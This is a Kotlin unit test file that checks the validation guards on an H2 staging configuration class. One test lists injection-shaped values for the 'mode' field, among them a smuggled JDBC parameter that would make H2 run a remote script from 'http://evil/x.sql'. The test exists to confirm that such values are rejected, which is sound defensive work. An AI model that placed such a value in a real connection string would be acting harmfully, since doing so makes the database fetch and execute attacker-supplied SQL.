package co.datapipelines.staging

import io.kotest.assertions.throwables.shouldThrow
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain
import org.junit.jupiter.api.Test

/**
 * The `init` guards on [H2StagingProperties] (ST-TEST-6). They were entirely untested, and one
 * of them is a security boundary: `mode` is interpolated straight into the JDBC URL, where H2
 * accepts further `;`-separated parameters — `INIT=RUNSCRIPT FROM 'http://…'` among them. The
 * SAFE_MODE shape check is what stops an operator-config value from becoming URL injection.
 */
class H2StagingPropertiesTest {
    @Test
    fun `defaults construct and mirror the documented configuration`() {
        val props = H2StagingProperties()

        props.mode shouldBe "PostgreSQL"
        props.maxMemoryMb shouldBe 1024
        props.insertBatchSize shouldBe 1000
        props.resultBatchSize shouldBe 10_000
        props.queryTimeoutSeconds shouldBe 60
    }

    @Test
    fun `an injection-shaped mode is rejected before it can reach the JDBC URL`() {
        val injections =
            listOf(
                "PostgreSQL;INIT=RUNSCRIPT FROM 'http://evil/x.sql'",
                "PostgreSQL;ACCESS_MODE_DATA=rws",
                "PostgreSQL ",
                "",
                "1Regular",
                "Post_greSQL",
            )

        injections.forEach { mode ->
            val thrown = shouldThrow<IllegalArgumentException> { H2StagingProperties(mode = mode) }
            val message = thrown.message ?: ""
            message shouldContain "not a bare H2 mode name"
        }
    }

    @Test
    fun `every out-of-range numeric bound is rejected, naming the field`() {
        // field name → a constructor call that violates only that field's guard.
        val violations =
            listOf<Pair<String, () -> H2StagingProperties>>(
                "maxMemoryMb" to { H2StagingProperties(maxMemoryMb = 0) },
                "maxMemoryMb" to { H2StagingProperties(maxMemoryMb = -1) },
                "insertBatchSize" to { H2StagingProperties(insertBatchSize = 0) },
                "insertBatchSize" to { H2StagingProperties(insertBatchSize = -5) },
                "resultBatchSize" to { H2StagingProperties(resultBatchSize = 0) },
                "queryTimeoutSeconds" to { H2StagingProperties(queryTimeoutSeconds = -1) },
            )

        violations.forEach { (field, construct) ->
            val thrown = shouldThrow<IllegalArgumentException> { construct() }
            val message = thrown.message ?: ""
            message shouldContain field
        }
    }

    @Test
    fun `a zero query timeout is allowed — JDBC's no-timeout`() {
        H2StagingProperties(queryTimeoutSeconds = 0).queryTimeoutSeconds shouldBe 0
    }
}
